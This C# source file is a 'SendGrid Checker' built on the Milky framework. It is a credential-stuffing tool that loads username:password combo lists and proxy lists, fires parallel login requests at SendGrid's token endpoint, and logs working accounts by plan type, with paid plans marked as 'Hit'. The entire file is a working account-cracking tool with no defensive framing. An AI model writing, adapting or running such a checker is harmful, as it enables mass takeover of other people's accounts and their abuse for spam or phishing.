using Milky.Objects;
using MilkyNet;
using Newtonsoft.Json;
using System;
using System.Threading;
using System.Threading.Tasks;
using static Milky.Output.OutputSettings;

namespace SendGrid_Checker
{
    class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            var Milky = new MilkyManager();
            Milky.ProgramManager.Initialize("SendGrid Checker", "1.0.0", "Laiteux", "https://pastebin.com/raw/QW82zeqi");

            var threads = Milky.UserUtils.AskInteger("Threads");
            Milky.RunSettings.threads = threads;
            ThreadPool.SetMinThreads(threads, threads);
            
            Milky.RunSettings.proxyProtocol = Milky.UserUtils.AskChoice("Proxy Protocol", new string[] { "HTTP", "SOCKS4", "SOCKS5" });
            
            Milky.FileUtils.LoadCombos("Username:Password");
            Milky.FileUtils.LoadProxies(Milky.RunSettings.proxyProtocol);

            Milky.ConsoleSettings.SetTitleStyle(true, true);

            Milky.RunManager.StartRun();

            var random = new Random();

            Parallel.ForEach(Milky.RunLists.combos, new ParallelOptions { MaxDegreeOfParallelism = Milky.RunSettings.threads }, combo =>
            {
                var splittedCombo = combo.Split(':');

                var resultType = ResultType.Invalid;
                var captures = new CaptureDictionary();

                if (splittedCombo.Length == 2)
                {
                    var login = splittedCombo[0];
                    var password = splittedCombo[1];

                    while (resultType == ResultType.Invalid)
                    {
                        var request = Milky.RequestUtils.SetProxy(new MilkyRequest()
                        {
                            Cookies = new CookieDictionary()
                        });

                        try
                        {
                            request.AddHeader("Content-Type", "application/json");

                            var response1 = Milky.RequestUtils.Execute(request,
                                HttpMethod.POST, "https://api.sendgrid.com/v3/public/tokens",
                                "{\"username\":\"" + login + "\",\"password\":\"" + password + "\"}");
                            var source1 = response1.ToString();
                            var json1 = JsonConvert.DeserializeObject<dynamic>(source1);

                            if (json1.token != null)
                            {
                                request.AddHeader("Authorization", "token " + json1.token);

                                var response2 = Milky.RequestUtils.Execute(request,
                                    HttpMethod.GET,
                                    "https://api.sendgrid.com/v3/user/package");
                                var source2 = response2.ToString();
                                var json2 = JsonConvert.DeserializeObject<dynamic>(source2);

                                captures.Add("Package", (string)json2.name);

                                resultType = json2.plan_type == "free" ? ResultType.Free : ResultType.Hit;
                            }
                            else if(source1.Contains("authorization required") || source1.Contains("access forbidden") || source1.Contains("bad request") || source1.Contains("required"))
                            {
                                break;
                            }
                        }
                        catch { }

                        request.Dispose();
                    }
                }

                Milky.RunManager.SubmitComboResult(combo, resultType, captures);
            });

            Milky.RunManager.FinishRun();

            Thread.Sleep(-1);
        }
    }
}
